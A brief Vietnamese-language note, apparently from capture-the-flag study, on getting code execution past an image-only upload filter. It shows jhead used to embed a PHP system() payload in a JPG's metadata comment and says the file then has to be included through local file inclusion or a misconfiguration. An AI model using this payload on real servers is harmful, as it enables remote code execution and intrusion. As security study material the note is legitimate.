# RCE khi upload file chỉ cho phép image extension
**References**: https://onestepcode.com/injecting-php-code-to-jpg/

1. Inject php code vào meta information của image, save as image.jpg

```bash
jhead -ce file.jpg # The -ce option of jhead will launch a text editor to edit the comment section of the metadata.
# <?php system('find / | grep flag'); __halt_compiler(); ?>
```

2. Khi đọc file thì tất nhiên php code sẽ không được executed bởi file này được xem là jpg. Ở đây cần lợi dụng thêm lỗ hổng nào đó như LFI  để include file này hoặc dựa vào missconfiguration,...
